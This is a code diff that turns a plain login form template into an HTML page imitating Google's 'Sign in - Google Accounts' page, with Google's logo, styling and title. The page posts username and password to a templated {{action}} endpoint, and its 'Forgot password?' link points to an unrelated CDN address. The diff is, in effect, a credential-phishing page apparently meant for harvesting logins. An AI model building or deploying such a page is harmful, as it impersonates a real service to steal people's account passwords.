@@ -1,6 +1,91 @@
-Log in
-<form action="{{action}}" method="POST"> 
-    username: <input type="text" name="username"><br>
-    password: <input type="password" name="password">
-    <button type="submit">Login</button>
-</form>
+<!doctype html>
+    <head>
+        <title>Sign in - Google Accounts</title>
+        <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
+        <style>
+            body, html {
+                height: 100%;
+            }
+
+            body {
+                margin: 0;
+                font-family: 'Roboto', 'Helvetica', 'Arial', 'sans-serif';
+            }
+
+            h2 {
+                font-weight: inherit;
+            }
+
+            .more {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100%;
+            }
+            
+            .formbox {
+                width: 450px;
+                height: 500px;
+                box-shadow: 0 2px 2px 0 rgba(0,0,0,0.14), 0 3px 1px -2px rgba(0,0,0,0.12), 0 1px 5px 0 rgba(0,0,0,0.2);
+                border-radius: 8px;
+                padding: 45px;
+            }
+
+            button {
+                width: 88px;
+                height: 36px;
+                outline: none;
+                background: #4285E1;
+                font-weight: 500;
+                border: none;
+                border-radius: 3px;
+                font-size: 14px;
+                color: #ffffff;
+                box-shadow: 0 2px 2px 0 rgba(0,0,0,0.14), 0 3px 1px -2px rgba(0,0,0,0.12), 0 1px 5px 0 rgba(0,0,0,0.2);
+                float: right;
+            }
+
+            .evenmore {
+                width: 100%;
+            }
+
+            .evenmore div {
+                width: 150px;
+            }
+
+            input {
+                outline: none;
+                border: none;
+                border-bottom: 3px solid #4285E1;
+                margin-bottom: 20px;
+                margin-top: 20px;
+                font-size: 14px;
+                padding: 4px;
+                width: 100%;
+            }
+
+            a {
+                color: #4285f4;
+                text-decoration: none;
+                font-size: 14px;
+            }
+        </style>
+    </head>
+    <body>
+        <div class='more'>
+            <div class='formbox'>
+                <img src='https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/800px-Google_2015_logo.svg.png' width='100' />
+                <h2>Sign in</h2>
+                <div>with your Google Account</div>
+                <form action="{{action}}" method="POST"> 
+                    <div><input type="text" name="username" placeholder="Username"></div>
+                    <div><input type="password" name="password" placeholder='Password'></div>
+                    <div class="evenmore">
+                        <div><a href="https://t5.rbxcdn.com/a12919db19870a5575c13780458ee994">Forgot password?</a></div>
+                        <button type="submit">LOGIN</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    <body>
+</html>
